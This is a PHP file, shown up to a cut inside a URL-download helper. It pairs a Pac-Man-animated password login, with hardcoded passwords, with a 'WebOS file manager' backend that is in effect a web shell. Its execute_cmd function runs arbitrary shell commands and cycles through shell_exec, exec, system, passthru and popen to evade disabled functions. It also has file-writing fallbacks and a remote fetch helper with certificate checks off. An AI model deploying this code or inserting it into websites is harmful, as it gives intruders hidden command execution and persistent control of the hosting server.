<?php
session_start();

// === LOGIN HANDLER ===
if (isset($_GET['login'])) {
    header('Content-Type: application/json');
    $pwd = $_POST['login_password'] ?? '';
    
    if ($pwd === 'pacman') {
        $_SESSION['logged_in'] = true;
        $_SESSION['role'] = 'pacman';
        echo json_encode(['status' => 'ok']);
    } elseif ($pwd === '@xshikata') {
        $_SESSION['logged_in'] = true;
        $_SESSION['role'] = 'admin';
        echo json_encode(['status' => 'ok']);
    } else {
        echo json_encode(['status' => 'error', 'msg' => 'Incorrect Password']);
    }
    exit;
}

if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: ?");
    exit;
}

$is_logged_in = isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
$user_role = $_SESSION['role'] ?? '';

if (!$is_logged_in) {
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>WebOS Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://public.codepenassets.com/css/reset-2.0.min.css">
    <style>
        /* PASTE SELURUH CSS DARI FILE pacman.html ASLI DI SINI */
        @import url("https://fonts.googleapis.com/css?family=Press+Start+2P");
        :root { --bg-color: black; --border-color: #1500C5; --ghost-color: #EA82E5; --ghost-eye-color: white; --ghost-run-color: #1B00FF; --ghost-pupil-color: #1500C5; --pacman-color: #fdff00; --pellet-color: #EBAE9F; --text-color: white; }
        [v-cloak] { display: none; }
         * { box-sizing: border-box; }
         body { display: flex; align-items: center; justify-content: center; height: 100vh; background: var(--bg-color); margin: 0; overflow: hidden; }
    
    /* PENGECILAN SKALA LOGIN */
         #app { transform: scale(0.75); transform-origin: center; width: 100%; max-width: 400px; }
         @media (max-width: 600px) { #app { transform: scale(0.65); } }

         form { overflow: hidden; font-family: "Press Start 2p", monospace; text-transform: uppercase; color: var(--text-color); }
         label { display: block; font-size: 12px; margin-bottom: 15px; text-align: center; }
         input { margin-bottom: 30px; padding: 15px 0; width: 100%; font-family: "Press Start 2p", monospace; font-size: 18px; text-transform: uppercase; color: var(--pellet-color); background-color: transparent; border: 4px double var(--border-color); border-left-width: 0; border-right-width: 0; text-align: center; }
         input[type=password] { letter-spacing: 12px; }
         input[type=button] { cursor: pointer; border: none; font-size: 16px; transition: 0.3s; }
         input[type=button]:hover { color: var(--pacman-color); }
         input:focus { border-color: var(--pellet-color); outline: none; }
    
        .scene-wrapper { position: relative; height: 80px; }
        .input-cover { position: absolute; top: 0; left: -52px; width: calc(100% + 52px); height: 52px; background-color: var(--bg-color); z-index: 1; }
        .pac-wrapper, .ghost-wrapper { position: absolute; top: 0; left: 0; width: 100%; height: 52px; overflow: hidden; z-index: 2; }
    
    /* Animasi & Shadow Pacman tetap dipertahankan (Scale handled by #app) */
        .pacman, .ghost { position: absolute; top: 0; width: 4px; height: 4px; z-index: 2; transform-origin: 100% 100%; }
        .pacman { right: 52px; animation: waka 0.3s steps(1) infinite forwards; }
        .pacman:before, .pacman:after { content: ""; position: absolute; width: 100%; height: 100%; } .pacman:before { bottom: 52px; } .pacman:after { bottom: 104px; }
        @keyframes waka { 0% { margin-top: 0; } 25% { margin-top: 52px; } 50% { margin-top: 104px; } 75% { margin-top: 52px; } 100% { margin-top: 0; } }
        @keyframes invalid-shake { 0% { transform: translate(0, 0); } 10% { transform: translate(4px, 2px); } 20% { transform: translate(-4px, -2px); } 30% { transform: translate(6px, 3px); } 40% { transform: translate(-6px, -3px); } 50% { transform: translate(6px, 3px); } 60% { transform: translate(-4px, -2px); } 70% { transform: translate(4px, 2px); } 80% { transform: translate(2px, -1px); } 90% { transform: translate(-2px, 1px); } 100% { transform: translate(0); } }
        .pacman-invalid-enter-active, .pacman-invalid-leave-active, .pacman-success-enter-active, .cover-enter-active { transition: transform 2s linear; }
        .pacman-success-leave-active { transition: transform 1.6666666667s 1s linear; } .ghost-enter-active { transition: transform 1.8181818182s 0.5s linear; }
        .pacman-invalid-enter, .pacman-invalid-leave-to, .pacman-success-enter, .pacman-success-leave-to, .pacman-enter, .cover-enter, .cover-leave-to { transform: translateX(-100%); }
        .ghost-enter-to { transform: translateX(-104px); } .cover-enter-to, .cover-leave-to { transform: translateX(52px); } .pacman-invalid-enter-to, .pacman-success-enter-to { transform: translateX(104px); }
        .ghost-enter { transform: translateX(100%); } .pacman-invalid-leave-to .pacman, .pacman-success-leave-to .pacman { transform: scaleX(-1); }
        .fade-enter-active, .fade-leave-active { transition: opacity 0.4s ease-out; } .fade-enter, .fade-leave-to { opacity: 0; }
        /* Box Shadows Pacman & Ghost */
        .pacman { box-shadow: 16px 0px var(--pacman-color), 20px 0px var(--pacman-color), 24px 0px var(--pacman-color), 28px 0px var(--pacman-color), 32px 0px var(--pacman-color), 36px 0px var(--pacman-color), 8px 4px var(--pacman-color), 12px 4px var(--pacman-color), 16px 4px var(--pacman-color), 20px 4px var(--pacman-color), 24px 4px var(--pacman-color), 28px 4px var(--pacman-color), 32px 4px var(--pacman-color), 36px 4px var(--pacman-color), 40px 4px var(--pacman-color), 44px 4px var(--pacman-color), 4px 8px var(--pacman-color), 8px 8px var(--pacman-color), 12px 8px var(--pacman-color), 16px 8px var(--pacman-color), 20px 8px var(--pacman-color), 24px 8px var(--pacman-color), 28px 8px var(--pacman-color), 32px 8px var(--pacman-color), 36px 8px var(--pacman-color), 40px 8px var(--pacman-color), 44px 8px var(--pacman-color), 48px 8px var(--pacman-color), 4px 12px var(--pacman-color), 8px 12px var(--pacman-color), 12px 12px var(--pacman-color), 16px 12px var(--pacman-color), 20px 12px var(--pacman-color), 24px 12px var(--pacman-color), 28px 12px var(--pacman-color), 32px 12px var(--pacman-color), 36px 12px var(--pacman-color), 40px 12px var(--pacman-color), 44px 12px var(--pacman-color), 48px 12px var(--pacman-color), 0px 16px var(--pacman-color), 4px 16px var(--pacman-color), 8px 16px var(--pacman-color), 12px 16px var(--pacman-color), 16px 16px var(--pacman-color), 20px 16px var(--pacman-color), 24px 16px var(--pacman-color), 28px 16px var(--pacman-color), 32px 16px var(--pacman-color), 36px 16px var(--pacman-color), 40px 16px var(--pacman-color), 44px 16px var(--pacman-color), 48px 16px var(--pacman-color), 52px 16px var(--pacman-color), 0px 20px var(--pacman-color), 4px 20px var(--pacman-color), 8px 20px var(--pacman-color), 12px 20px var(--pacman-color), 16px 20px var(--pacman-color), 20px 20px var(--pacman-color), 24px 20px var(--pacman-color), 28px 20px var(--pacman-color), 32px 20px var(--pacman-color), 36px 20px var(--pacman-color), 40px 20px var(--pacman-color), 44px 20px var(--pacman-color), 48px 20px var(--pacman-color), 52px 20px var(--pacman-color), 0px 24px var(--pacman-color), 4px 24px var(--pacman-color), 8px 24px var(--pacman-color), 12px 24px var(--pacman-color), 16px 24px var(--pacman-color), 20px 24px var(--pacman-color), 24px 24px var(--pacman-color), 28px 24px var(--pacman-color), 32px 24px var(--pacman-color), 36px 24px var(--pacman-color), 40px 24px var(--pacman-color), 44px 24px var(--pacman-color), 48px 24px var(--pacman-color), 52px 24px var(--pacman-color), 0px 28px var(--pacman-color), 4px 28px var(--pacman-color), 8px 28px var(--pacman-color), 12px 28px var(--pacman-color), 16px 28px var(--pacman-color), 20px 28px var(--pacman-color), 24px 28px var(--pacman-color), 28px 28px var(--pacman-color), 32px 28px var(--pacman-color), 36px 28px var(--pacman-color), 40px 28px var(--pacman-color), 44px 28px var(--pacman-color), 48px 28px var(--pacman-color), 52px 28px var(--pacman-color), 0px 32px var(--pacman-color), 4px 32px var(--pacman-color), 8px 32px var(--pacman-color), 12px 32px var(--pacman-color), 16px 32px var(--pacman-color), 20px 32px var(--pacman-color), 24px 32px var(--pacman-color), 28px 32px var(--pacman-color), 32px 32px var(--pacman-color), 36px 32px var(--pacman-color), 40px 32px var(--pacman-color), 44px 32px var(--pacman-color), 48px 32px var(--pacman-color), 52px 32px var(--pacman-color), 4px 36px var(--pacman-color), 8px 36px var(--pacman-color), 12px 36px var(--pacman-color), 16px 36px var(--pacman-color), 20px 36px var(--pacman-color), 24px 36px var(--pacman-color), 28px 36px var(--pacman-color), 32px 36px var(--pacman-color), 36px 36px var(--pacman-color), 40px 36px var(--pacman-color), 44px 36px var(--pacman-color), 48px 36px var(--pacman-color), 4px 40px var(--pacman-color), 8px 40px var(--pacman-color), 12px 40px var(--pacman-color), 16px 40px var(--pacman-color), 20px 40px var(--pacman-color), 24px 40px var(--pacman-color), 28px 40px var(--pacman-color), 32px 40px var(--pacman-color), 36px 40px var(--pacman-color), 40px 40px var(--pacman-color), 44px 40px var(--pacman-color), 48px 40px var(--pacman-color), 8px 44px var(--pacman-color), 12px 44px var(--pacman-color), 16px 44px var(--pacman-color), 20px 44px var(--pacman-color), 24px 44px var(--pacman-color), 28px 44px var(--pacman-color), 32px 44px var(--pacman-color), 36px 44px var(--pacman-color), 40px 44px var(--pacman-color), 44px 44px var(--pacman-color), 16px 48px var(--pacman-color), 20px 48px var(--pacman-color), 24px 48px var(--pacman-color), 28px 48px var(--pacman-color), 32px 48px var(--pacman-color), 36px 48px var(--pacman-color); }
        .pacman:before { box-shadow: 16px 0px var(--pacman-color), 20px 0px var(--pacman-color), 24px 0px var(--pacman-color), 28px 0px var(--pacman-color), 32px 0px var(--pacman-color), 36px 0px var(--pacman-color), 8px 4px var(--pacman-color), 12px 4px var(--pacman-color), 16px 4px var(--pacman-color), 20px 4px var(--pacman-color), 24px 4px var(--pacman-color), 28px 4px var(--pacman-color), 32px 4px var(--pacman-color), 36px 4px var(--pacman-color), 40px 4px var(--pacman-color), 44px 4px var(--pacman-color), 4px 8px var(--pacman-color), 8px 8px var(--pacman-color), 12px 8px var(--pacman-color), 16px 8px var(--pacman-color), 20px 8px var(--pacman-color), 24px 8px var(--pacman-color), 28px 8px var(--pacman-color), 32px 8px var(--pacman-color), 36px 8px var(--pacman-color), 40px 8px var(--pacman-color), 44px 8px var(--pacman-color), 48px 8px var(--pacman-color), 4px 12px var(--pacman-color), 8px 12px var(--pacman-color), 12px 12px var(--pacman-color), 16px 12px var(--pacman-color), 20px 12px var(--pacman-color), 24px 12px var(--pacman-color), 28px 12px var(--pacman-color), 32px 12px var(--pacman-color), 36px 12px var(--pacman-color), 40px 12px var(--pacman-color), 44px 12px var(--pacman-color), 48px 12px var(--pacman-color), 0px 16px var(--pacman-color), 4px 16px var(--pacman-color), 8px 16px var(--pacman-color), 12px 16px var(--pacman-color), 16px 16px var(--pacman-color), 20px 16px var(--pacman-color), 24px 16px var(--pacman-color), 28px 16px var(--pacman-color), 32px 16px var(--pacman-color), 36px 16px var(--pacman-color), 40px 16px var(--pacman-color), 0px 20px var(--pacman-color), 4px 20px var(--pacman-color), 8px 20px var(--pacman-color), 12px 20px var(--pacman-color), 16px 20px var(--pacman-color), 20px 20px var(--pacman-color), 24px 20px var(--pacman-color), 28px 20px var(--pacman-color), 0px 24px var(--pacman-color), 4px 24px var(--pacman-color), 8px 24px var(--pacman-color), 12px 24px var(--pacman-color), 16px 24px var(--pacman-color), 0px 28px var(--pacman-color), 4px 28px var(--pacman-color), 8px 28px var(--pacman-color), 12px 28px var(--pacman-color), 16px 28px var(--pacman-color), 20px 28px var(--pacman-color), 24px 28px var(--pacman-color), 28px 28px var(--pacman-color), 0px 32px var(--pacman-color), 4px 32px var(--pacman-color), 8px 32px var(--pacman-color), 12px 32px var(--pacman-color), 16px 32px var(--pacman-color), 20px 32px var(--pacman-color), 24px 32px var(--pacman-color), 28px 32px var(--pacman-color), 32px 32px var(--pacman-color), 36px 32px var(--pacman-color), 40px 32px var(--pacman-color), 4px 36px var(--pacman-color), 8px 36px var(--pacman-color), 12px 36px var(--pacman-color), 16px 36px var(--pacman-color), 20px 36px var(--pacman-color), 24px 36px var(--pacman-color), 28px 36px var(--pacman-color), 32px 36px var(--pacman-color), 36px 36px var(--pacman-color), 40px 36px var(--pacman-color), 44px 36px var(--pacman-color), 48px 36px var(--pacman-color), 4px 40px var(--pacman-color), 8px 40px var(--pacman-color), 12px 40px var(--pacman-color), 16px 40px var(--pacman-color), 20px 40px var(--pacman-color), 24px 40px var(--pacman-color), 28px 40px var(--pacman-color), 32px 40px var(--pacman-color), 36px 40px var(--pacman-color), 40px 40px var(--pacman-color), 44px 40px var(--pacman-color), 48px 40px var(--pacman-color), 8px 44px var(--pacman-color), 12px 44px var(--pacman-color), 16px 44px var(--pacman-color), 20px 44px var(--pacman-color), 24px 44px var(--pacman-color), 28px 44px var(--pacman-color), 32px 44px var(--pacman-color), 36px 44px var(--pacman-color), 40px 44px var(--pacman-color), 44px 44px var(--pacman-color), 16px 48px var(--pacman-color), 20px 48px var(--pacman-color), 24px 48px var(--pacman-color), 28px 48px var(--pacman-color), 32px 48px var(--pacman-color), 36px 48px var(--pacman-color); }
        .pacman:after { box-shadow: 16px 0px var(--pacman-color), 20px 0px var(--pacman-color), 24px 0px var(--pacman-color), 28px 0px var(--pacman-color), 32px 0px var(--pacman-color), 36px 0px var(--pacman-color), 8px 4px var(--pacman-color), 12px 4px var(--pacman-color), 16px 4px var(--pacman-color), 20px 4px var(--pacman-color), 24px 4px var(--pacman-color), 28px 4px var(--pacman-color), 32px 4px var(--pacman-color), 36px 4px var(--pacman-color), 4px 8px var(--pacman-color), 8px 8px var(--pacman-color), 12px 8px var(--pacman-color), 16px 8px var(--pacman-color), 20px 8px var(--pacman-color), 24px 8px var(--pacman-color), 28px 8px var(--pacman-color), 32px 8px var(--pacman-color), 4px 12px var(--pacman-color), 8px 12px var(--pacman-color), 12px 12px var(--pacman-color), 16px 12px var(--pacman-color), 20px 12px var(--pacman-color), 24px 12px var(--pacman-color), 28px 12px var(--pacman-color), 0px 16px var(--pacman-color), 4px 16px var(--pacman-color), 8px 16px var(--pacman-color), 12px 16px var(--pacman-color), 16px 16px var(--pacman-color), 20px 16px var(--pacman-color), 24px 16px var(--pacman-color), 0px 20px var(--pacman-color), 4px 20px var(--pacman-color), 8px 20px var(--pacman-color), 12px 20px var(--pacman-color), 16px 20px var(--pacman-color), 20px 20px var(--pacman-color), 0px 24px var(--pacman-color), 4px 24px var(--pacman-color), 8px 24px var(--pacman-color), 12px 24px var(--pacman-color), 16px 24px var(--pacman-color), 0px 28px var(--pacman-color), 4px 28px var(--pacman-color), 8px 28px var(--pacman-color), 12px 28px var(--pacman-color), 16px 28px var(--pacman-color), 20px 28px var(--pacman-color), 0px 32px var(--pacman-color), 4px 32px var(--pacman-color), 8px 32px var(--pacman-color), 12px 32px var(--pacman-color), 16px 32px var(--pacman-color), 20px 32px var(--pacman-color), 24px 32px var(--pacman-color), 4px 36px var(--pacman-color), 8px 36px var(--pacman-color), 12px 36px var(--pacman-color), 16px 36px var(--pacman-color), 20px 36px var(--pacman-color), 24px 36px var(--pacman-color), 28px 36px var(--pacman-color), 4px 40px var(--pacman-color), 8px 40px var(--pacman-color), 12px 40px var(--pacman-color), 16px 40px var(--pacman-color), 20px 40px var(--pacman-color), 24px 40px var(--pacman-color), 28px 40px var(--pacman-color), 32px 40px var(--pacman-color), 8px 44px var(--pacman-color), 12px 44px var(--pacman-color), 16px 44px var(--pacman-color), 20px 44px var(--pacman-color), 24px 44px var(--pacman-color), 28px 44px var(--pacman-color), 32px 44px var(--pacman-color), 36px 44px var(--pacman-color), 16px 48px var(--pacman-color), 20px 48px var(--pacman-color), 24px 48px var(--pacman-color), 28px 48px var(--pacman-color), 32px 48px var(--pacman-color), 36px 48px var(--pacman-color); }
        .ghost { box-shadow: 20px 0px var(--ghost-color), 24px 0px var(--ghost-color), 28px 0px var(--ghost-color), 32px 0px var(--ghost-color), 12px 4px var(--ghost-color), 16px 4px var(--ghost-color), 20px 4px var(--ghost-color), 24px 4px var(--ghost-color), 28px 4px var(--ghost-color), 32px 4px var(--ghost-color), 36px 4px var(--ghost-color), 40px 4px var(--ghost-color), 8px 8px var(--ghost-color), 12px 8px var(--ghost-color), 16px 8px var(--ghost-color), 20px 8px var(--ghost-color), 24px 8px var(--ghost-color), 28px 8px var(--ghost-color), 32px 8px var(--ghost-color), 36px 8px var(--ghost-color), 40px 8px var(--ghost-color), 44px 8px var(--ghost-color), 4px 12px var(--ghost-color), 8px 12px var(--ghost-eye-color), 12px 12px var(--ghost-eye-color), 16px 12px var(--ghost-color), 20px 12px var(--ghost-color), 24px 12px var(--ghost-color), 28px 12px var(--ghost-color), 32px 12px var(--ghost-eye-color), 36px 12px var(--ghost-eye-color), 40px 12px var(--ghost-color), 44px 12px var(--ghost-color), 48px 12px var(--ghost-color), 4px 16px var(--ghost-eye-color), 8px 16px var(--ghost-eye-color), 12px 16px var(--ghost-eye-color), 16px 16px var(--ghost-eye-color), 20px 16px var(--ghost-color), 24px 16px var(--ghost-color), 28px 16px var(--ghost-eye-color), 32px 16px var(--ghost-eye-color), 36px 16px var(--ghost-eye-color), 40px 16px var(--ghost-eye-color), 44px 16px var(--ghost-color), 48px 16px var(--ghost-color), 4px 20px var(--ghost-pupil-color), 8px 20px var(--ghost-pupil-color), 12px 20px var(--ghost-eye-color), 16px 20px var(--ghost-eye-color), 20px 20px var(--ghost-color), 24px 20px var(--ghost-color), 28px 20px var(--ghost-pupil-color), 32px 20px var(--ghost-pupil-color), 36px 20px var(--ghost-eye-color), 40px 20px var(--ghost-eye-color), 44px 20px var(--ghost-color), 48px 20px var(--ghost-color), 0px 24px var(--ghost-color), 4px 24px var(--ghost-pupil-color), 8px 24px var(--ghost-pupil-color), 12px 24px var(--ghost-eye-color), 16px 24px var(--ghost-eye-color), 20px 24px var(--ghost-color), 24px 24px var(--ghost-color), 28px 24px var(--ghost-pupil-color), 32px 24px var(--ghost-pupil-color), 36px 24px var(--ghost-eye-color), 40px 24px var(--ghost-eye-color), 44px 24px var(--ghost-color), 48px 24px var(--ghost-color), 52px 24px var(--ghost-color), 0px 28px var(--ghost-color), 4px 28px var(--ghost-color), 8px 28px var(--ghost-eye-color), 12px 28px var(--ghost-eye-color), 16px 28px var(--ghost-color), 20px 28px var(--ghost-color), 24px 28px var(--ghost-color), 28px 28px var(--ghost-color), 32px 28px var(--ghost-eye-color), 36px 28px var(--ghost-eye-color), 40px 28px var(--ghost-color), 44px 28px var(--ghost-color), 48px 28px var(--ghost-color), 52px 28px var(--ghost-color), 0px 32px var(--ghost-color), 4px 32px var(--ghost-color), 8px 32px var(--ghost-color), 12px 32px var(--ghost-color), 16px 32px var(--ghost-color), 20px 32px var(--ghost-color), 24px 32px var(--ghost-color), 28px 32px var(--ghost-color), 32px 32px var(--ghost-color), 36px 32px var(--ghost-color), 40px 32px var(--ghost-color), 44px 32px var(--ghost-color), 48px 32px var(--ghost-color), 52px 32px var(--ghost-color), 0px 36px var(--ghost-color), 4px 36px var(--ghost-color), 8px 36px var(--ghost-color), 12px 36px var(--ghost-color), 16px 36px var(--ghost-color), 20px 36px var(--ghost-color), 24px 36px var(--ghost-color), 28px 36px var(--ghost-color), 32px 36px var(--ghost-color), 36px 36px var(--ghost-color), 40px 36px var(--ghost-color), 44px 36px var(--ghost-color), 44px 36px var(--ghost-color), 48px 36px var(--ghost-color), 52px 36px var(--ghost-color), 0px 40px var(--ghost-color), 4px 40px var(--ghost-color), 8px 40px var(--ghost-color), 12px 40px var(--ghost-color), 16px 40px var(--ghost-color), 20px 40px var(--ghost-color), 24px 40px var(--ghost-color), 28px 40px var(--ghost-color), 32px 40px var(--ghost-color), 36px 40px var(--ghost-color), 40px 40px var(--ghost-color), 44px 40px var(--ghost-color), 44px 40px var(--ghost-color), 48px 40px var(--ghost-color), 52px 40px var(--ghost-color), 0px 44px var(--ghost-color), 4px 44px var(--ghost-color), 12px 44px var(--ghost-color), 16px 44px var(--ghost-color), 20px 44px var(--ghost-color), 32px 44px var(--ghost-color), 36px 44px var(--ghost-color), 40px 44px var(--ghost-color), 48px 44px var(--ghost-color), 52px 44px var(--ghost-color), 0px 48px var(--ghost-color), 16px 48px var(--ghost-color), 20px 48px var(--ghost-color), 32px 48px var(--ghost-color), 36px 48px var(--ghost-color), 52px 48px var(--ghost-color); }
        .ghost.runaway { box-shadow: 20px 0px var(--ghost-run-color), 24px 0px var(--ghost-run-color), 28px 0px var(--ghost-run-color), 32px 0px var(--ghost-run-color), 12px 4px var(--ghost-run-color), 16px 4px var(--ghost-run-color), 20px 4px var(--ghost-run-color), 24px 4px var(--ghost-run-color), 28px 4px var(--ghost-run-color), 32px 4px var(--ghost-run-color), 36px 4px var(--ghost-run-color), 40px 4px var(--ghost-run-color), 8px 8px var(--ghost-run-color), 12px 8px var(--ghost-run-color), 16px 8px var(--ghost-run-color), 20px 8px var(--ghost-run-color), 24px 8px var(--ghost-run-color), 28px 8px var(--ghost-run-color), 32px 8px var(--ghost-run-color), 36px 8px var(--ghost-run-color), 40px 8px var(--ghost-run-color), 44px 8px var(--ghost-run-color), 4px 12px var(--ghost-run-color), 8px 12px var(--ghost-run-color), 12px 12px var(--ghost-run-color), 16px 12px var(--ghost-run-color), 20px 12px var(--ghost-run-color), 24px 12px var(--ghost-run-color), 28px 12px var(--ghost-run-color), 32px 12px var(--ghost-run-color), 36px 12px var(--ghost-run-color), 40px 12px var(--ghost-run-color), 44px 12px var(--ghost-run-color), 48px 12px var(--ghost-run-color), 4px 16px var(--ghost-run-color), 8px 16px var(--ghost-run-color), 12px 16px var(--ghost-run-color), 16px 16px var(--ghost-eye-color), 20px 16px var(--ghost-eye-color), 24px 16px var(--ghost-run-color), 28px 16px var(--ghost-run-color), 32px 16px var(--ghost-eye-color), 36px 16px var(--ghost-eye-color), 40px 16px var(--ghost-run-color), 44px 16px var(--ghost-run-color), 48px 16px var(--ghost-run-color), 4px 20px var(--ghost-run-color), 8px 20px var(--ghost-run-color), 12px 20px var(--ghost-run-color), 16px 20px var(--ghost-eye-color), 20px 20px var(--ghost-eye-color), 24px 20px var(--ghost-run-color), 28px 20px var(--ghost-run-color), 32px 20px var(--ghost-eye-color), 36px 20px var(--ghost-eye-color), 40px 20px var(--ghost-run-color), 44px 20px var(--ghost-run-color), 48px 20px var(--ghost-run-color), 0px 24px var(--ghost-run-color), 4px 24px var(--ghost-run-color), 8px 24px var(--ghost-run-color), 12px 24px var(--ghost-run-color), 16px 24px var(--ghost-run-color), 20px 24px var(--ghost-run-color), 24px 24px var(--ghost-run-color), 28px 24px var(--ghost-run-color), 32px 24px var(--ghost-run-color), 36px 24px var(--ghost-run-color), 40px 24px var(--ghost-run-color), 44px 24px var(--ghost-run-color), 48px 24px var(--ghost-run-color), 52px 24px var(--ghost-run-color), 0px 28px var(--ghost-run-color), 4px 28px var(--ghost-run-color), 8px 28px var(--ghost-run-color), 12px 28px var(--ghost-run-color), 16px 28px var(--ghost-run-color), 20px 28px var(--ghost-run-color), 24px 28px var(--ghost-run-color), 28px 28px var(--ghost-run-color), 32px 28px var(--ghost-run-color), 36px 28px var(--ghost-run-color), 40px 28px var(--ghost-run-color), 44px 28px var(--ghost-run-color), 48px 28px var(--ghost-run-color), 52px 28px var(--ghost-run-color), 0px 32px var(--ghost-run-color), 4px 32px var(--ghost-run-color), 8px 32px var(--ghost-eye-color), 12px 32px var(--ghost-eye-color), 16px 32px var(--ghost-run-color), 20px 32px var(--ghost-run-color), 24px 32px var(--ghost-eye-color), 28px 32px var(--ghost-eye-color), 32px 32px var(--ghost-run-color), 36px 32px var(--ghost-run-color), 40px 32px var(--ghost-eye-color), 44px 32px var(--ghost-eye-color), 48px 32px var(--ghost-run-color), 52px 32px var(--ghost-run-color), 0px 36px var(--ghost-run-color), 4px 36px var(--ghost-eye-color), 8px 36px var(--ghost-run-color), 12px 36px var(--ghost-run-color), 16px 36px var(--ghost-eye-color), 20px 36px var(--ghost-eye-color), 24px 36px var(--ghost-run-color), 28px 36px var(--ghost-run-color), 32px 36px var(--ghost-eye-color), 36px 36px var(--ghost-eye-color), 40px 36px var(--ghost-run-color), 44px 36px var(--ghost-run-color), 44px 36px var(--ghost-run-color), 48px 36px var(--ghost-eye-color), 52px 36px var(--ghost-run-color), 0px 40px var(--ghost-run-color), 4px 40px var(--ghost-run-color), 8px 40px var(--ghost-run-color), 12px 40px var(--ghost-run-color), 16px 40px var(--ghost-run-color), 20px 40px var(--ghost-run-color), 24px 40px var(--ghost-run-color), 28px 40px var(--ghost-run-color), 32px 40px var(--ghost-run-color), 36px 40px var(--ghost-run-color), 40px 40px var(--ghost-run-color), 44px 40px var(--ghost-run-color), 44px 40px var(--ghost-run-color), 48px 40px var(--ghost-run-color), 52px 40px var(--ghost-run-color), 0px 44px var(--ghost-run-color), 4px 44px var(--ghost-run-color), 12px 44px var(--ghost-run-color), 16px 44px var(--ghost-run-color), 20px 44px var(--ghost-run-color), 32px 44px var(--ghost-run-color), 36px 44px var(--ghost-run-color), 40px 44px var(--ghost-run-color), 48px 44px var(--ghost-run-color), 52px 44px var(--ghost-run-color), 0px 48px var(--ghost-run-color), 16px 48px var(--ghost-run-color), 20px 48px var(--ghost-run-color), 32px 48px var(--ghost-run-color), 36px 48px var(--ghost-run-color), 52px 48px var(--ghost-run-color); }
    </style>
</head>
<body>
    <div id="app">
        <transition name="fade" mode="out-in" appear="appear" v-cloak="v-cloak">
            <form @submit.prevent="runPacman" v-if="!logged_in">
                <label for="password">Password</label>
                <div class="scene-wrapper">
                    <input @keyup.enter="runPacman" ref="password" id="password" type="password" v-model="password_entered" :class="{invalid : password_invalid}" :disabled="disableInput()"/>
                    <transition :name="transitionPacman" v-on:after-enter="checkPassword">
                        <div class="pac-wrapper" v-if="animate_pacman">
                            <div class="pacman"></div>
                        </div>
                    </transition>
                    <transition name="cover">
                        <div class="input-cover" v-if="animate_pacman || animate_ghost"></div>
                    </transition>
                    <transition name="ghost" v-on:after-enter="resetAnimation">
                        <div class="ghost-wrapper" v-if="animate_ghost">
                            <div class="ghost" :class="{runaway : password_match}"></div>
                        </div>
                    </transition>
                </div>
                <input @click="runPacman" ref="start" type="button" value="Press Start" :disabled="disableInput()"/>
            </form>
            <div class="logged-in" v-else="v-else">
                <p>You are now logged in.</p>
                <p>Welcome!</p>
            </div>
        </transition>
    </div>

    <script src='https://cdnjs.cloudflare.com/ajax/libs/vue/2.5.15/vue.js'></script>
    <script>
    const app = new Vue({
        el: '#app',
        data: {
            animate_ghost: false,
            animate_pacman: false,
            logged_in: false,
            password_entered: '',
            password_invalid: false,
            password_match: false,
            password_tries: 0 
        },
        computed: {
            transitionPacman() {
                return this.password_match ? 'pacman-success' : 'pacman-invalid';
            } 
        },
        methods: {
            checkPassword() {
                this.animate_ghost = true;
                this.animate_pacman = false;
                if (!this.password_match) {
                    this.password_invalid = true;
                    this.$refs.start.value = 'Incorrect Password!';
                } else {
                    this.$refs.start.value = 'Logging in';
                }
            },
            disableInput() {
                return this.animate_pacman || this.animate_ghost;
            },
            resetAnimation() {
                this.animate_ghost = false;
                this.password_invalid = false;
                this.password_entered = '';
                this.password_tries++;

                if (this.password_match) {
                    this.logged_in = true;
                    setTimeout(() => location.reload(), 500); // Reload halaman setelah sukses
                } else {
                    this.$refs.start.value = 'Try Again';
                }
                setTimeout(() => { if(this.$refs.password) this.$refs.password.focus() }, 100);
            },
            runPacman(e) {
                e.preventDefault();
                this.animate_pacman = true;
                this.$refs.start.value = 'Checking...';
                
                // Melakukan asinkron request ke backend PHP
                let formData = new URLSearchParams();
                formData.append('login_password', this.password_entered);
                fetch('?login=1', { method: 'POST', body: formData })
                .then(res => res.json())
                .then(data => {
                    this.password_match = (data.status === 'ok');
                }).catch(() => {
                    this.password_match = false;
                });
            }
        },
        mounted() {
            this.$refs.password.focus();
        } 
    });
    </script>
</body>
</html>
<?php
    exit;
}
// === QUANTUM WEBOS FILE MANAGER ===
// === VERSION: 13.19 (Card Menu Hitbox Bugfix) ===
// === 1. THE QUANTUM API BACKEND ===
$base_dir = realpath(__DIR__);

// Fungsi Polyfill Fallback JSON
function custom_json_encode($value) {
    if (function_exists('json_encode')) return json_encode($value);
    if (is_null($value)) return 'null';
    if (is_bool($value)) return $value ? 'true' : 'false';
    if (is_integer($value) || is_float($value)) return $value;
    if (is_string($value)) return '"' . addcslashes($value, "\n\r\t\"\\") . '"';
    if (is_array($value)) {
        $is_assoc = array_keys($value) !== range(0, count($value) - 1);
        $res = [];
        foreach ($value as $k => $v) {
            $res[] = ($is_assoc ? '"' . addcslashes($k, "\n\r\t\"\\") . '":' : '') . custom_json_encode($v);
        }
        return $is_assoc ? '{' . implode(',', $res) . '}' : '[' . implode(',', $res) . ']';
    }
    return '""';
}

// Fallback Eksekusi Terminal (CMD)
function execute_cmd($cmd) {
    $out = '';
    if (function_exists('shell_exec')) { $out = @shell_exec($cmd . ' 2>&1'); }
    elseif (function_exists('exec')) { @exec($cmd . ' 2>&1', $arr); $out = implode("\n", $arr); }
    elseif (function_exists('system')) { ob_start(); @system($cmd . ' 2>&1'); $out = ob_get_clean(); }
    elseif (function_exists('passthru')) { ob_start(); @passthru($cmd . ' 2>&1'); $out = ob_get_clean(); }
    elseif (is_resource($f = @popen($cmd . ' 2>&1', 'r'))) { while (!feof($f)) { $out .= fread($f, 1024); } pclose($f); }
    return $out;
}

// Fallback Menulis File (Edit & Upload)
function write_file($path, $content) {
    if (function_exists('file_put_contents')) {
        $res = @file_put_contents($path, $content);
        if ($res !== false) return true;
    }
    if ($fp = @fopen($path, 'w')) {
        $res = @fwrite($fp, $content);
        @fclose($fp);
        return $res !== false;
    }
    return false;
}

// Fallback Download via URL
function fetch_url($url) {
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
